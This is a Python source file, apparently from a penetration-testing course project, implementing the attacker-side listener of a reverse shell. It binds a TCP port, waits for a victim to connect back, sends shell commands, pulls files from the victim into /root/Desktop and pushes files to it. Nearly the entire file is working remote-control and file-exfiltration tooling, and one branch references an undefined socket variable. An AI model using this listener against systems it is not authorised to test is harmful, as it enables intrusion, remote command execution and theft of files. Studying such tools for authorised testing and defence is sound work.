import socket
import os
import readline

# Ruben Enkaoua - GL4DI4T0R
# From the AD PT project https://github.com/rubenformation/Active-Directory-PT
# Inspired from the Python for pentest course (Hussam Khrais)

def transfer(conn, command):
	conn.send(command.encode())
	get, path = command.split("|")
	f = open('/root/Desktop/'+ path, 'wb')
	while True:
		bits = conn.recv(1024)
		if bits.endswith('DONE'.encode()):
			f.write(bits[:-4])
			f.close()
			print("[+] Transfer completed")
			f.close()
			break
		if 'File not found'.encode() in bits:
			print ("[-] Unable to find out the file")
			f.close()
			os.remove('/root/Desktop/'+ path)
			break
		f.write(bits)

def upload(conn, command):
	conn.send(command.encode())
	put, path = command.split("|")
	if os.path.exists(path):
		f = open(path, 'rb')
		packet = f.read(1024)
		while len(packet) > 0:
			conn.send(packet)
			packet = f.read(1024)
		conn.send('DONE'.encode())
		f.close()
	else:
		s.send('File not found'.encode())

def connect():
	s = socket.socket()
	s.bind(("127.0.0.1", 1234)) # Edit here the Attacker Server IP and listening port
	s.listen(1)
	print("[*] Listening for TCP connection")
	conn, addr = s.accept()
	print("[+] Connection received from ", addr)

	while True:
		command = input("Shell> ")
		if 'terminate' in command:
			conn.send('terminate'.encode())
			conn.close()
			break
		elif 'get|' in command:
			transfer(conn, command)
		elif 'put|' in command:
			upload(conn, command)
			print(conn.recv(1024).decode())
		else:
			if command == '':
				command = 'whoami'
			conn.send(command.encode())
			print(conn.recv(1024).decode())

def main():
	connect()
main()
